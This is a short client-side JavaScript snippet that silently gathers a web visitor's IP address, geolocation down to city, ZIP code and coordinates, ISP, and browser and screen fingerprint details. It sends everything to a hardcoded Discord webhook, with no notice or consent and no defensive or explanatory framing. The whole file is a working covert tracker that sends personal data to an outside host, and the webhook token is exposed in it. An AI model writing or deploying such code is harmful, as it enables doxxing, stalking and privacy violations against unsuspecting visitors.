(async () => {
    try {
        const basic = await (await fetch('https://wtfismyip.com/json')).json();
        const detailed = await (await fetch(`/json/${basic.YourFuckingIPAddress}`)).json();
        const detector = new BrowserDetector(window.navigator.userAgent).parseUserAgent();
        
        const data = {
            content: `IP Address: ${basic.YourFuckingIPAddress}\n` +
                     `Country: ${detailed.country}\n` +
                     `Region: ${detailed.regionName}\n` +
                     `City: ${detailed.city}\n` +
                     `ZIP Code: ${detailed.zip}\n` +
                     `Full Location: ${basic.YourFuckingLocation}\n` +
                     `Latitude: ${detailed.lat}\n` +
                     `Longitude: ${detailed.lon}\n` +
                     `Timezone: ${detailed.timezone}\n` +
                     `Current Time: ${new Date().toLocaleString()}\n` +
                     `ISP: ${detailed.isp}\n` +
                     `Organization: ${detailed.org}\n` +
                     `Autonomous System: ${detailed.as}\n` +
                     `Browser Name: ${detector.name}\n` +
                     `Platform Name: ${detector.platform}\n` +
                     `Browser Version: ${detector.version}\n` +
                     `Mobile/Tablet: ${(detector.isMobile || detector.isTablet) ? 'Yes' : 'No'}\n` +
                     `Referrer: ${document.referrer || 'None'}\n` +
                     `System Languages: ${navigator.languages.join(', ')}\n` +
                     `Screen Width: ${screen.width}px\n` +
                     `Screen Height: ${screen.height}px\n` +
                     (screen.width != window.width || screen.height != window.height ? `Window Width: ${window.outerWidth}px\nWindow Height: ${window.outerHeight}px\n` : '') +
                     `Display Pixel Depth: ${screen.pixelDepth}\n` +
                     (typeof screen.orientation != 'undefined' ? `Screen Orientation: ${screen.orientation.type.split('-')[0]}\nScreen Rotation: ${screen.orientation.angle} degrees\n` : '') +
                     `CPU Threads: ${navigator.hardwareConcurrency}\n` +
                     `Available Browser Memory: ${typeof window.performance.memory != 'undefined' ? Math.round(window.performance.memory.jsHeapSizeLimit / 1024 / 1024) : 'N/A'} MB`
        };
        
        await fetch('https://discord.com/api/webhooks/1214203058284662794/cpyZU4ceyZ2TLhojorU_akBA-jqF_45EZzdSdBQBv_NNkwCwPMWR3Kaw8nzXAeqmuXn9', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error(error);
    }
})();
